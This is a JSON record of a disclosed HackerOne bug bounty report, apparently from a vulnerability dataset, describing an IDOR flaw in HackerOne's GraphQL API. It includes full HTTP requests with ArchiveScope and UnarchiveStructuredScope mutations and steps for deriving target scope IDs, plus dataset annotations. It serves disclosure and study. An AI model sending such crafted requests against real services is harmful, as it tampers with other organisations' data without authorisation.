@@ -1,0 +1,38 @@
+{
+    "reported_to": "HackerOne",
+    "reported_by": "ahacker1 ",
+    "title": "An attacker can archive and unarchive any structured scope object on HackerOne",
+    "content": "\nSummary:\nHello, I have discovered an IDOR vulnerability that allows the scope of any program to be archived. Scopes are used to give information about the valid scopes of a program. For example HackerOne has the following scopes:\nhttps://hackerone.com\nhttps://api.hackerone.com\n...\nSteps To Reproduce\nObtain the structured_scope_id:\nThis can be found by base64 encoding: gid://hackerone/StructuredScope/NUMBER\nFor example, if the number was 94773 , the structered_scope_id would be Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==\nOr, it could be found by intercepting the response of the program profile page.\nSend the Following Request:\nCode 774 Bytes\n1POST /graphql HTTP/2\n2Host: hackerone.com\n3Content-Length: 388\n4Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"\n5Accept: */*\n6X-Auth-Token: AUTHTOKEN\n7Content-Type: application/json\n8Origin: https://hackerone.com\n9Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit\n10Accept-Encoding: gzip, deflate\n11Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7\n12\n13{\"operationName\":\"ArchiveScope\",\"variables\":{\"structured_scope_id\":\"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==\"},\"query\":\"mutation ArchiveScope($structured_scope_id: ID!) {\\n  archiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\\n    was_successful\\n    structured_scope {\\n      id\\n      archived_at\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\nIt is also possible to unarchive scopes of other programs with the following request.:\nCode 795 Bytes\n1POST /graphql HTTP/2\n2Host: hackerone.com\n3Content-Length: 414\n4Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"\n5Accept: */*\n6X-Auth-Token: \u2588\u2588\u2588\u2588\n7Content-Type: application/json\n8Origin: https://hackerone.com\n9Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit\n10Accept-Encoding: gzip, deflate\n11Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7\n12\n13{\"operationName\":\"UnarchiveStructuredScope\",\"variables\":{\"structured_scope_id\":\"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==\"},\"query\":\"mutation UnarchiveStructuredScope($structured_scope_id: ID!) {\\n  unarchiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\\n    was_successful\\n    structured_scope {\\n      id\\n      archived_at\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\nEven though the response will say no structured scope exists, the scope will be archived.\nReplace the structured_scope_id with the scope you wish to target and the X-Auth-Token with your token.\nI will provide an Mp4 PoC soon.\nImpact\nAn attacker could archive or unarchive all 90000+ scopes on HackerOne.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "None"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1650320520,
+    "report_url": "https://hackerone.com/reports/1501611",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "MEDIUM",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Obtain the structured_scope_id by base64 encoding a gid://hackerone/StructuredScope/NUMBER or intercepting the response of the program profile page."
+        ],
+        [
+            2,
+            "Send a POST request to /graphql with the structured_scope_id and X-Auth-Token to archive or unarchive the scope."
+        ]
+    ],
+    "vuln_description": "An IDOR vulnerability allows an attacker to archive or unarchive any structured scope object on HackerOne, potentially affecting all 90000+ scopes.",
+    "reason": "The attack involves understanding the GraphQL API structure and how to manipulate scope objects, but the steps are straightforward once the API endpoint and required parameters are known.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
